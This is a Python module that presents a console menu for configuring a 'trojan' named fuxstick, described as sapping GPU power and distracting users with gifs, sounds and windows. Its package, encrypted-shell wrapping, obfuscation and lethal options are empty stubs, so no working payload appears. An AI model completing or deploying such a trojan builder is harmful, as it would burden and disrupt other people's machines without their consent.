#valtyr
import json
import utilities

def get_config():
    return json.load(open('data/fuxstick.json'))

def set_config():
    return

def fuxstick():
    print('\n[A harmful or harmless trojan that saps gpu power and distracts]')
    print('\nCurrent configuration:')
    config=get_config()

    gifs=config['path_gifs'] if config['path_gifs'] is not "" else "Unset"
    sound=config['path_sound'] if config['path_sound'] is not "" else "Unset"
    titles=config['path_titles'] if config['path_titles'] is not "" else "Unset"
    windows=config['windows'] if config['windows'] is not "" else "Unset"

    print('Gifs:\t\t'+gifs)
    print('Sound:\t\t'+sound)
    print('Titles:\t\t'+titles)
    print('Windows:\t'+str(windows))


    print('\n[0] set path gif')
    print('[1] set path sound')
    print('[2] set path titles')
    print('[3] set window amount')
    print('[4] set lethal/unlethal')
    print('[=] package')
    print('[*] wrap encry shell')
    print('[+] obfuscate')
    print('[-] exit to main')
    while True:
        cmd=input('< ')
        if cmd=='0':
            config['path_gifs']=input('path< ')
        elif cmd=='1':
            config['path_sound']=input('path< ')
        elif cmd=='2':
            config['path_titles']=input('path< ')
        elif cmd=='3':
            config['windows']=input('path< ')
        elif cmd=='4':
            pass
        elif cmd=='=':
            pass
        elif cmd=='*':
            pass
        elif cmd=='+':
            pass
        elif cmd=='-':
            break
        else:
            pass
        utilities.write('data/fuxstick.json','w+',json.dumps(config))

    return